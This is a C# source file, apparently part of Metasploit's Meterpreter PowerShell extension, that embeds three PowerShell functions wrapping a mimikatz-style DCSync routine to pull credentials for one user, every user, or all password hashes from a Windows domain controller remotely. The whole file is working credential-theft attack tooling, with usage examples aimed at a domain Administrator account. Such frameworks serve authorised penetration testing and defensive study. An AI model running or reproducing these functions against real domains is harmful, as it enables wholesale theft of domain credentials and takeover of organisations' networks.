using System.Collections.Generic;

namespace MSF.Powershell
{
    internal static class Scripts
    {
        private static readonly string InvokeDcSync = @"
function Invoke-DcSync {
  <#
    .SYNOPSIS
      Use the DCSync functionality to DCSync a single user from the target domain.

    .PARAMETER User
      Specifies the Domain\Username of the target user.

    .PARAMETER DomainController
      Specifies the domain controller to pull the information from.

    .PARAMETER DomainFqdn
      Specifies the FQDN of the domain.

    .INPUTS
      None.

    .OUTPUTS
      A single SyncRecord instance is returned.

    .EXAMPLE
      Invoke-DcSync -User VICIMDOMAIN\Administrator
  #>
  param(
    [Parameter(Mandatory=$true)]
    [String]
    [ValidateNotNullOrEmpty()]
    $User,
    [String]
    $DomainController,
    [String]
    $DomainFqdn
  )
  return [MSF.Powershell.Meterpreter.Kiwi]::DcSync($User, $DomainController, $DomainFqdn)
} ";

        private static readonly string InvokeDcSyncAll = @"
function Invoke-DcSyncAll {
  <#
    .SYNOPSIS
      Use the DCSync functionality to DCSync every user that's present in the DC.

      It is recommended that this script be invoked inside channelised shell
      (via powershell_shell) because it can take a while in large domains.

    .PARAMETER Domain
      Specifies the domain name to contact for extracting all the users from.

    .PARAMETER DomainController
      Specifies the domain controller to pull the values from.

    .PARAMETER DomainFqdn
      Specifies the FQDN of the domain.

    .PARAMETER -IncludeEmpty
      If set to True, then all accounts that have ""empty"" hashes (generally disabled or
      unusable accounts) will be included in the output.

    .PARAMETER -IncludeMachineAccounts
      If set to True, then all accounts that are machine accounts (accounts ending in $)
      will be included in the output.

    .INPUTS
      None.

    .OUTPUTS
      A collection of SyncRecord instances is returned.

    .EXAMPLE
      Invoke-DcSyncAll -Domain VICIMDOMAIN
  #>
  param(
    [Parameter(Mandatory=$true)]
    [String]
    [ValidateNotNullOrEmpty()]
    $Domain,
    [String]
    $DomainController,
    [String]
    $DomainFqdn,
    [Switch]
    $IncludeEmpty,
    [Switch]
    $IncludeMachineAccounts
  )
  $s = New-Object MSF.Powershell.Meterpreter.Kiwi+DcSyncAllSettings
  $s.Domain = $Domain
  $s.DomainController = $DomainController
  $s.DomainFqdn = $DomainFqdn
  $s.IncludeEmpty = $IncludeEmpty
  $s.IncludeMachineAccounts = $IncludeMachineAccounts
  return [MSF.Powershell.Meterpreter.Kiwi]::DcSyncAll($s)
} ";

        private static readonly string InvokeDcSyncHashDump = @"
function Invoke-DcSyncHashDump {
  <#
    .SYNOPSIS
      Use the DCSync functionality to dump every user hash from the DC. This is
      basically attempting to be a hashdump function that works remotely and doesn't
      require the need to be on the DC, or to extract NTDS.dit.

      It is recommended that this script be invoked inside channelised shell
      (via powershell_shell) because it can take a while in large domains.

    .PARAMETER Domain
      Specifies the domain name that is the target of the hash dumping.

    .PARAMETER DomainController
      Specifies the domain controller to pull the values from.

    .PARAMETER DomainFqdn
      Specifies the FQDN of the domain.

    .PARAMETER -IncludeEmpty
      If set to True, then all accounts that have ""empty"" hashes (generally disabled or
      unusable accounts) will be included in the output.

    .PARAMETER -IncludeMachineAccounts
      If set to True, then all accounts that are machine accounts (accounts ending in $)
      will be included in the output.

    .INPUTS
      None.

    .OUTPUTS
      A collection of String instances is returned that matches the typical hashdump format.

    .EXAMPLE
      Invoke-DcSyncHashDump -Domain VICIMDOMAIN
  #>
  param(
    [Parameter(Mandatory=$true)]
    [String]
    [ValidateNotNullOrEmpty()]
    $Domain,
    [String]
    $DomainController,
    [String]
    $DomainFqdn,
    [Switch]
    $IncludeEmpty,
    [Switch]
    $IncludeMachineAccounts
  )
  $s = New-Object MSF.Powershell.Meterpreter.Kiwi+DcSyncAllSettings
  $s.Domain = $Domain
  $s.DomainController = $DomainController
  $s.DomainFqdn = $DomainFqdn
  $s.IncludeEmpty = $IncludeEmpty
  $s.IncludeMachineAccounts = $IncludeMachineAccounts
  return [MSF.Powershell.Meterpreter.Kiwi]::DcSyncHashDump($s)
} ";

        internal static IEnumerable<string> GetAllScripts()
        {
            return new List<string>
            {
                InvokeDcSync,
                InvokeDcSyncAll,
                InvokeDcSyncHashDump,
            };
        }
    }
}
